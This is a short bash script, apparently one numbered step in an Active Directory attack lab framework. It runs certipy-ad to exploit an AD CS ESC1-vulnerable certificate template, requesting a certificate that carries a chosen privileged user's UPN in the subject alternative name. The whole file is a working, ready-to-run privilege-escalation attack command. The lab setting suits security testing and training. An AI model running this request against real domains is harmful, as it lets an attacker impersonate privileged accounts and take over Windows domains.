#!/bin/bash
# CONFIGURED—CA cadre-CA running, ESC1 template published
source "$(dirname "$0")/../lib/cadre-env.sh"
source "$(dirname "$0")/../lib/common.sh"

start_attack "050" "ESC1 — Certificate Request (dangerous SAN)"

require_tool certipy-ad

log "Requesting certificate with embedded UPN/SAN"
run_cmd "certipy-ad req -ca $CA_NAME -template CADRE-ESC1 -upn chief_command@$DOMAIN_ROOT -dns $DC01 -u $ATTACK_USER@$DOMAIN_ROOT -p '$ATTACK_PASS' -dc-ip $DC01"
result $? "ESC1 — certificate request"
